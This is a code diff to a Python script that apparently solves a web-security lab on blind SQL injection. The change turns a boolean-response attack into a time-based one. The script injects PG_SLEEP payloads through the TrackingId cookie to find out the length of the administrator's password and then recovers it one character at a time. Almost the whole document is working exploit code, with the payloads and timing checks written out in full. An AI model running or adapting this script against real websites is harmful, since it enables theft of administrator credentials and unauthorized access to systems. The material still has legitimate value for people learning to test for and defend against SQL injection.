@@ -2,8 +2,8 @@ import requests
 import string
 import sys
 import os
-import urllib.parse
 import getopt
+import urllib.parse
 
 
 def clear_screen():
@@ -18,7 +18,9 @@ def get_password_length(url, trackingId, session):
   i = 0
 
   while True:
-    payload = f"' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) > {i}) = 'a"
+    # If you get errors or false positives try incrementing the number 
+    # in the payload at "THEN PG_SLEEP(10)"
+    payload = f"'; SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) = {i}) THEN PG_SLEEP(10) ELSE PG_SLEEP(0) END FROM users--"
     payload = urllib.parse.quote_plus(payload)
     cookies = {
       "TrackingId":trackingId + payload,
@@ -26,15 +28,15 @@ def get_password_length(url, trackingId, session):
       }
     r = requests.get(url, cookies = cookies)
 
-    if "Welcome back!" not in r.text:
-      clear_screen()
-      print(f"[*] The password length is {password_length} characters long")
-      break
-    else:
+    if int(r.elapsed.total_seconds()) < 5:
       clear_screen()
       print(f"[-] The password length is {password_length} characters long")
       i += 1
       password_length += 1
+    else:
+      clear_screen()
+      print(f"[*] The password length is {password_length} characters long")
+      break
 
   return password_length
 
@@ -48,7 +50,9 @@ def get_password(password_length, url, trackingId, session):
 
   for i in range(password_length):
     for x in characters:
-      payload = f"'AND (SELECT SUBSTRING(password, {i + 1}, 1) FROM users WHERE username = 'administrator') = '{x}"
+      # If you get errors or false positives try incrementing the number 
+      # in the payload at "THEN PG_SLEEP(10)"
+      payload = f"'; SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, {i + 1}, 1) = '{x}') THEN PG_SLEEP(10) ELSE PG_SLEEP(0) END FROM users--"
       payload = urllib.parse.quote_plus(payload)
       cookies = {
         "TrackingId":trackingId + payload,
@@ -56,7 +60,7 @@ def get_password(password_length, url, trackingId, session):
         }
       r = requests.get(url, cookies = cookies)
 
-      if "Welcome back!" in r.text:
+      if int(r.elapsed.total_seconds()) >= 10:
         password += x
         print(x, end = '', flush = True)
         break
@@ -83,7 +87,7 @@ def main(argv):
   try:
     opts, args = getopt.getopt(argv, "hu:")
   except getopt.GetoptError:
-    print("This is the script for:\n'Blind SQL injection with conditional responses'\n\nUsage: bsqli-1.py -u <url>")
+    print("This is the script for:\n'Blind SQL injection with time delays and information retrieval'\n\nUsage: bsqli-4.py -u <url>")
     print("\x1b[?25h")
     sys.exit(2)
 
@@ -92,7 +96,7 @@ def main(argv):
       url = arg
       trackingId, session = get_cookie(url)
     elif opt == "-h":
-      print("This is the script for:\n'Blind SQL injection with conditional responses'\n\nUsage: bsqli-1.py -u <url>")
+      print("This is the script for:\n'Blind SQL injection with time delays and information retrieval'\n\nUsage: bsqli-4.py -u <url>")
       print("\x1b[?25h")
       sys.exit()
   password_length = get_password_length(url, trackingId, session)
